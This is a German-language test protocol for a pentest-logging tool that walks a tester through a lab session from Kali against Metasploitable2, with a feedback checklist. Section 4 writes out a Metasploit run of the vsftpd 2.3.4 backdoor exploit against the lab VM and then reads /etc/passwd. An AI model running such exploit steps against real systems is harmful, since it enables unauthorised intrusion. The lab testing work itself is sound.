# Praxistest: erste echte Session gegen Metasploitable2

Stand 2026-10-18. Eine Session von der Installation bis zur Sicherung, in der Kali in SmartLearn gegen Metasploitable2 (hier `192.168.56.101`, bei dir evtl. anders). Dauer etwa 60 Minuten. Am Ende schickst du die ausgefüllte **Checkliste** (Abschnitt 13) und, wenn möglich, das **Testmaterial** (Abschnitt 14).

Tipp: Notiere dir während des Tests zu jedem Schritt die Uhrzeit (`date`), wenn dir etwas auffällt.

## 1 Installation

Nach [Installation](installation.md), Weg A, B oder C, dann:

```sh
ariadne doctor            # ganze Ausgabe für die Rückmeldung kopieren
ariadne setup
```

Alle Terminals schliessen, ein neues QTerminal öffnen, dann `ariadne init`. Lass deine **originale `~/.zshrc`** von Kali stehen (nichts anpassen): Genau die wollen wir testen.

## 2 Start

```sh
ariadne start ms2 --target 192.168.56.101 --not-customer
ariadne status
```

Öffne zwei Terminals: eines in QTerminal, eines in der Webkonsole (Terminal im Kali-Desktop über den Browser). Beide sollen in `ariadne status` erscheinen.

Trage dein sudo-Passwort als **eigenes Secret** ein (Eingabe ohne Echo). Nur eingetragene Werte ersetzt Ariadne vor Export und KI; ohne diesen Schritt kann Schritt 11 nichts zeigen:

```sh
ariadne secrets add sudo
ariadne secrets list      # «Eigene Secrets: sudo»
```

## 3 Scan

```sh
nmap -sV -sC 192.168.56.101 -oX ~/ms2-sv-sc.xml
```

Öffne `ariadne ui` (Firefox in der Kali). Erwartet: ein Host mit etwa 20 Diensten auf der Karte, in «Als Nächstes» **ein** Denkanstoss «Versionen recherchieren: 192.168.56.101 (… Dienste)» mit der Liste und je einem `searchsploit`-Befehl zum Kopieren (E119).

**Optional: KI-Denkanstoss.** Nur wenn du die KI nach [Installation](installation.md) 2 eingerichtet hast (`ariadne ai setup`, `ariadne ai check` ohne `fail`):

```sh
ariadne ai allow-cloud    # nur bei Anbieter cloud
ariadne ai status         # «bereit», Verbrauch des Monats notieren
```

Im Dashboard unter «Als Nächstes» «Denkanstoss anfordern (KI)» drücken. Erwartet: Fortschritt mit Tokens und Zahl der maskierten Werte, danach ein bis drei KI-Denkanstösse. Einen davon «erledigt», einen «verwerfen». Danach `ariadne ai status`: Verbrauch gestiegen. Bei einem Fehler die Meldung im Dashboard wörtlich notieren (z. B. Modell-ID unbekannt, Ollama ohne Modell, TLS-Aufbruch, Ablehnung).

## 4 Exploit

```sh
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
run
```

In der Shell: `id`, `hostname`, `cat /etc/passwd | head -3`.

## 5 Kontext

In «Als Nächstes» sollte ein Kontextvorschlag für dieses Terminal mit Host 192.168.56.101 stehen. Bestätigen. In einem zweiten Terminal:

```sh
ariadne mark foothold --host 192.168.56.101 --note "vsftpd Backdoor"
```

## 6 Pause

`F12` dann `r` (oder `ariadne pause --minutes 2`), etwas Harmloses tippen (`echo geheim-test`), dann `F12 r` bzw. `ariadne resume`. Erwartet: `geheim-test` erscheint nirgends in der Zeitachse.

## 7 Scope-Warnung

```sh
nmap -sL -n 10.10.10.99      # Listen-Scan: nennt das Ziel, schickt ihm aber nichts
```

Erwartet: Die Warnung «Ziel ausserhalb des Scopes» steht als **erster Eintrag** in «Als Nächstes» (E120), mit «Quittieren». Quittieren; sie verschwindet.

## 8 Dashboard vom Mac

Nach [Anleitung Fernzugriff](anleitung-fernzugriff.md) 7: `ariadne-mac start`. Dasselbe Projekt muss im Browser des Macs erscheinen. In der Kali `ariadne ui --sessions`: Die Mac-Sitzung steht dort mit Herkunft «über sshd».

## 9 Finding

Im Dashboard, Reiter Findings: «vsftpd 2.3.4 Backdoor», Schwere Kritisch, als Beleg die Zeile mit `uid=0(root)` aus der Belegansicht («Als Finding»).

## 10 Screenshot

```sh
ariadne shot window --note "root-Shell"
```

Erwartet: Das Bild erscheint in der Zeitachse.

## 11 Export

```sh
ariadne export --template cys
ariadne export --liste
```

Öffne die Markdown-Dateien (`02 Writeup.md`, `Belege/*.md`). Erwartet:

- Eigene Secrets aus Schritt 2 (dein sudo-Passwort), wo sie im Klartext standen (z. B. `echo PASSWORT | sudo -S id`): als Sternchen gleicher Länge. Im Rohtext der Datei stehen sie mit Backslash (`\*\*\*\*…`), in einer Markdown-Vorschau als `****…`.
- Eingaben ohne Echo (Passwortabfrage von `sudo`, `ssh`): als `••••••••`.
- Bekannte Credentials aus dem Ziel (Hashes, Passwörter aus Ausgaben): als `••••••••`.
- Unter `Belege/Screenshots.md` das Bild aus Schritt 10 mit Notiz «root-Shell», Fenster und Terminal.

Steht dein sudo-Passwort irgendwo im Klartext: Problem, Datei und Zeile notieren (nicht das Passwort).

## 12 Stop und Sicherung

Voraussetzung: Empfänger der Sicherung in `~/.config/ariadne/backup-recipients.txt` (siehe [Installation](installation.md) 1). Fehlt die Datei, bricht `backup` mit «Keine Empfänger für die Sicherung» ab.

```sh
ariadne stop
install -d -m 700 ~/Abgabe
ariadne backup --to-file ~/Abgabe/sicherung-$(date -u +%Y%m%dT%H%M%SZ).age
```

Oder vom Mac: `ariadne-mac stop` (sichert und sperrt). Die Ausgabe zeigt pro Projekt den Kettenkopf; notieren.

## 13 Checkliste für die Rückmeldung

Pro Punkt: **ok**, **Problem** (was genau, Uhrzeit) oder **nicht geprüft**.

| Nr. | Was beobachten | Ergebnis |
|---|---|---|
| 1 | `ariadne doctor`: ganze Ausgabe, besonders «Weboberfläche», «Swap», «ptrace_scope» | |
| 2 | **Zeitstempel bei 1 vCPU:** Stimmen die Zeiten in der Zeitachse mit `date` überein (Abweichung in Sekunden)? Wird der Scan während `nmap` spürbar langsamer, hängt das Terminal? | |
| 3 | **F12** in QTerminal: kommt `F12 r` bei Ariadne an (Pause), oder fängt QTerminal die Taste ab? | |
| 4 | **F12** in der Webkonsole: dasselbe; fängt der Browser F12 ab (Entwicklertools)? | |
| 5 | **Titel:** Was steht in den Tab-Titeln von QTerminal und der Webkonsole? Erscheinen Steuerzeichen oder Ariadne-Meldungen, die stören? | |
| 6 | **Eigene IP:** Taucht die IP der Kali als Host auf der Karte oder in Denkanstössen auf? (Soll nicht.) | |
| 7 | **Eingaben ohne Echo** mit der Original-zshrc: `sudo -k; sudo id` und ein `ssh`-Passwort. Erscheint das Passwort in der Zeitachse verdeckt (`••••`) oder im Klartext? Ist der Befehl danach korrekt erkannt? | |
| 8 | **sshd-Prozess:** Was zeigt `ariadne ui --sessions` in der Spalte Prozess für die Mac-Sitzung: lesbar oder «unbekannt»? | |
| 9 | **Firefox** in der Kali: Lädt das Dashboard (`ariadne ui`)? Fehler in der Konsole (`Ctrl+Shift+K`), z. B. CSP? | |
| 10 | **xclip/xsel:** Ausgabe von `command -v xclip xsel`. Funktioniert «Kopieren · Kali» bei einem `searchsploit`-Befehl? | |
| 11 | **Screenshots:** Funktioniert `ariadne shot window`, `monitor` und `region --region 0,0,400,300`? Richtiges Fenster? | |
| 12 | Denkanstoss «Versionen recherchieren» ein Mal pro Host, Liste vollständig, Befehle kopierbar | |
| 13 | Scope-Warnung als erster Eintrag, Quittieren wirkt, kommt bei neuem Ziel ausserhalb wieder | |
| 14 | Pause: nichts aus der Pause in der Zeitachse | |
| 15 | Export: lesbar, eigenes Secret (sudo) als Sternchen, Eingaben ohne Echo als `••••••••`, Screenshot mit Notiz | |
| 15a | Optional KI: Ergebnis (Anzahl Denkanstösse, brauchbar?), Kosten laut `ariadne ai status`, Meldung bei Fehlern wörtlich, erledigt/verwerfen wirkt | |
| 16 | Sicherung: Datei vorhanden, Kettenkopf notiert | |
| 17 | Sonst aufgefallen (Geschwindigkeit, Abstürze, unklare Texte) | |

## 14 Ausgaben als Testmaterial sicher exportieren

Rohausgaben helfen beim Testen der Parser (Offen O07). Sie können Passwörter und Hashes aus dem Ziel enthalten, darum nur verschlüsselt aus der Kali bringen.

1. Sammeln, nur Dateien aus dem Lab:
   ```sh
   install -d -m 700 ~/Abgabe/testmaterial
   cp ~/ms2-sv-sc.xml ~/Abgabe/testmaterial/
   ```
   Terminalausgaben, die du zusätzlich willst, mit `script` oder `> datei.txt` erzeugen, nicht aus dem Dashboard abschreiben.
2. Prüfen, dass **keine eigenen Secrets** drin sind (deine Passphrase, dein sudo-Passwort, API-Keys). Das Passwort wird ohne Echo gelesen und steht so nicht in der History; vorher pausieren, weil Ariadne auch Eingaben ohne Echo aufnimmt:
   ```sh
   ariadne pause --minutes 2
   printf 'Passwort: '; read -rs P; echo
   printf '%s\n' "$P" | grep -rIlF -f - ~/Abgabe/testmaterial   # Ausgabe muss leer sein
   unset P; ariadne resume
   ```
3. Verschlüsseln an den Sicherungsschlüssel des Macs (Anleitung Fernzugriff 4, öffentlicher Schlüssel beginnt mit `age1…`):
   ```sh
   tar -C ~/Abgabe -czf - testmaterial | age -r age1DEINSCHLUESSEL > ~/Abgabe/testmaterial.tar.gz.age
   ```
4. Über die Datei-Übertragung der Webkonsole auf den Mac holen und dort mit `age -d -i mac.key …` öffnen. Danach in der Kali `rm -r ~/Abgabe/testmaterial`.

Nie Rohausgaben unverschlüsselt per Mail oder Chat schicken.
